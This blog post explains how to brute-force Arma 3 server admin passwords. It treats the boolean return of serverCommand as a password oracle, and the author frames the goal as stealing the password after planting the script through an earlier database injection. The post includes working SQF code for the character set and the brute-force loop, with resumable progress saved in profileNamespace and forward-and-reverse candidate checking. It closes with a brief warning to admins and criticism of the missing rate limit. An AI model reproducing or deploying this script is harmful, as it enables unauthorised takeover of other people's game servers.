# Server Password Bruteforcing

I spent the last two days working on a method for stealing server admin passwords.
The plan was to combine it with the database injection from my [previous post] — drop the bruteforce into a server, let it run for weeks, walk away with the admin password.

The first problem: how do I know when a candidate password is actually correct?

Thanks to Bohemia Interactive, I didn't have to look very hard. The wiki page for [serverCommand] documents under its Alternative Syntax that the function returns `true` when the password is valid.

![serverCommand wiki excerpt showing the boolean return on a valid password](https://i.gyazo.com/8144d48f0111406552b69022ed4d48d9.png)

Great. So I have an oracle. All I need now is a generator that walks every possible server password and feeds each one to `serverCommand`.
I'm a little embarrassed by how long this took me to get right — I was very tired the first time I sat down with it.

---

Step one was the alphabet. I picked a set broad enough to cover what most admins actually use, but not so wide that I'd be churning through junk forever.

```sqf
_string = "abcdefghijklmnopqrstuvwxyz";
_string = _string + toUpper(_string);
_string = _string + "0123456789!@#$%^&*()+-_=[]{};:'""<,>.\|/?`~";
```

Then the actual generation block. This is the loop that walks the combination space and checks each candidate. If you're poking at this on your own, this is the part worth reading carefully.

```sqf
for "_passwordlength" from _count to 15 do {
    scopeName "NewPassword";
    _letters = profileNamespace getVariable ["oldletters", []];
    if (_letters isEqualTo []) then {
        for "_i" from 1 to _passwordlength do {
            _letters pushBack _firstChar;
        };
    };
    _iterIndex = 0;
    while {true} do {
        if (_iterIndex == count(_letters)) then {
            breakTo "NewPassword";
        };
        _dupe = +_letters;
        reverse _dupe;
        systemchat str(_dupe);
        uiSleep 0.05;
        _check = _dupe joinString "";
        if (_check serverCommand "#debug off") then {
            _found = true;
            _password = _check;
            breakTo "FoundPassword";
        };
        _check = _letters joinString "";
        if (_check serverCommand "#debug off") then {
            _found = true;
            _password = _check;
            breakTo "FoundPassword";
        };
        _letter = _letters select _iterIndex;
        _letterIndex = _string find _letter;
        if (_letter == _lastChar) then {
            _letters set [_iterIndex, _firstChar];
            _iterIndex = _iterIndex + 1;
            profileNamespace setVariable ["oldletters", _letters];
            saveProfileNamespace;
        } else {
            if (_iterIndex != 0) then {
                _letters set [_iterIndex, (_string select [_letterIndex + 1, 1])];
                _iterIndex = 0;
            } else {
                _letters set [_iterIndex, (_string select [_letterIndex + 1, 1])];
            };
        };
    };
};
```

Two details inside it that matter:

1. I store the last checked combination in `profileNamespace`. If the server reboots or gets shut down mid-run, I want to pick back up close to where I left off — not start over from `aaaa`.
2. I check each candidate both forwards and backwards using `reverse`. A password like `zaaa` would take ages to land on if I only walked forward; checking `aaaz` on the same pass roughly halves the worst case for asymmetrically-distributed passwords.

---

If you run an Arma 3 server, take this as a nudge to set a real password. Bruteforce and dictionary attacks against `serverCommand` are easy to set up and easy to leave running for weeks.

And if anyone at Bohemia Interactive happens to read this — please think about why `serverCommand` has no rate limit on bad passwords. The same class of oversight is what made the `createUnit RE` bug as bad as it was. The script API is full of these footguns and at this point in the game's life it's hard to call it anything but embarrassing.
